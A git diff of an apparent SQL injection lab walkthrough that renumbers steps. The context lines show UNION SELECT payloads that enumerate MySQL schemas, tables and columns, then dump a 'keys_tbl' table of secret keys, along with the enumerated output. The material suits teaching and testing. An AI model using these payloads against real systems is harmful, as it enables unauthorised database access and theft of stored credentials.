@@ -495,7 +495,7 @@ testquan' order by 5-- -
 
 <img width="1915" height="938" alt="image 14" src="https://github.com/user-attachments/assets/c6ec1369-bd74-45fb-b98c-5f231c653d8d" />  
 
-1. List all databases on the server:
+2. List all databases on the server:
 
 ```bash
 ' Union Select NULL,group_concat(schema_name),NULL,NULL,NULL From information_schema.schemata-- - 
@@ -504,7 +504,7 @@ testquan' order by 5-- -
 <img width="1914" height="937" alt="image 15" src="https://github.com/user-attachments/assets/7ec33733-677c-482d-bbc3-fc7df8d060b0" />  
 
 - information_schema,jobs,performance_schema,mysql,sys
-1. List all tables inside the **jobs** database:
+3. List all tables inside the **jobs** database:
 
 ```bash
 ' Union Select NULL,group_concat(table_name),NULL,NULL,NULL From information_schema.tables Where table_schema='jobs'-- -
@@ -513,7 +513,7 @@ testquan' order by 5-- -
 <img width="1913" height="936" alt="image 16" src="https://github.com/user-attachments/assets/635270d6-42d9-4982-a908-c2aef68c0510" />  
 
 - profiles,application,role,Users,position,keys_tbl,inventory
-1. List the columns of the table **keys_tbl**:
+4. List the columns of the table **keys_tbl**:
 
 ```bash
 ' Union Select NULL,group_concat(column_name),NULL,NULL,NULL From information_schema.columns Where table_schema='jobs' And table_name='keys_tbl'-- - 
@@ -522,7 +522,7 @@ testquan' order by 5-- -
 <img width="1912" height="938" alt="image 17" src="https://github.com/user-attachments/assets/8ad516ce-5362-48a9-83af-9237ed13fc48" />  
 
 - id,key_name,key_value
-1. Dump the entire **keys_tbl** table in the format **id:key_name:key_value**:
+5. Dump the entire **keys_tbl** table in the format **id:key_name:key_value**:
 
 ```bash
 ' Union Select NULL,group_concat(id,':',key_name,':',key_value),NULL,NULL,NULL From keys_tbl-- - 
